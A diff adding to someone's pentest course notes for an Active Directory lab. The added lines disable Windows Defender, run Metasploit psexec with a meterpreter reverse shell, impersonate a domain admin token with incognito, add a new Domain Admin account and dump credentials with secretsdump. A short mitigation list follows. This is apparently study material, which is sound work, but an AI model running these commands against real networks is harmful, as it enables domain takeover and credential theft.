@@ -536,6 +536,12 @@ we can do in different ways
 > type `show targets`
 > and try with PowerShell or Native upload
 
+**<span style="font-weight:bold; color:#00b050">if it fails anyway:</span>**
+open the windows machine (THEPUNISHER or SPIDERMAN)
+- type in the search bar -->  `virus and threat protection`
+- in the virtus and threat protection settings -->  click on Manage settings
+- turn all OFF
+
 ##### psexec.py
 `sudo psexec.py MARVEL/fcastle:'Password1'@172.16.214.130`
 [[cheet#psexec.py]]
@@ -755,3 +761,75 @@ with metasploit we can do -->  <span style="color:#00b050">token impersonation</
 							- impersonate the user that has this token
 ##### Attack
 We need to turn on THEPUNISHER and the Domain Controller
+there are a lot of tools for impersonation -->       - metasploit
+                                         - mimikatz 
+<span style="background:#fff88f">here we'll use metasploit</span>
+`msfconsole`
+`search psexec`
+`use exploit/windows/smb/psexec`
+`options`
+`set paylaod windows/x64/meterpreter/reverse_tcp`
+`set rhosts 172.16.214.130`       THEPUNISHER_IP
+`set smbuser fcastle`
+`set smbpass Password1`
+`set smbdomain MARVEL.local`
+`run`
+
+###### incognito
+`load incognito`
+> [!info] Load an extension
+> once you have a shell for example:
+ >`load incognito`
+> `options`              (to see all the extension commands) 
+> 
+> For example with incognito we can:
+> - list all the tokens
+> - impersonate a token
+> - add a user
+
+from THEPUNISHER machine:
+logout and login as -->  `MARVEL\administrator`  (`P@$$w0rd!`)
+=>
+in this way we have created -->  a <span style="color:#00b050">delegate token</span>
+=>
+
+from msfconsole:
+`list_tokens -u`        (-u -->  user)
+![[Pasted image 20240303121256.png]]
+`impersonate_token MARVEL\\administrator`
+
+how do we know that we are impersonating this user:
+type shell and whoami -->      `shell`
+                         `whoami`
+                         ![[Pasted image 20240303121406.png]]
+let's add one user:
+`net user /add hawkeye Password1@ /domain`
+add the user to the admin group:
+`net group "Domain Admins" hawkeye /ADD /DOMAIN`
+
+how to prove it:
+open a new terminal tab
+use -->  [[cheet#secretsdump]]
+`<span style="background:#fff88f">secretsdump.py MARVEL.local/hawkeye:'Password1@'@172.16.214.130</span>`       (domain controller IP)
+
+=>
+<span style="color:#00b050">with this attack we have:</span>
+- impersonate a domain admin
+- run commands
+- add user to the domain
+- made it a domain admin
+- compromise the domain without ever actually compromising an account outside THEPUNISHER machine
+
+##### Mitigation
+- Limit user/group token creation permission
+- local admin restriction
+- account tiering (categorizing customers into groups with similar characteristics and needs)
+
+
+
+
+
+
+
+
+
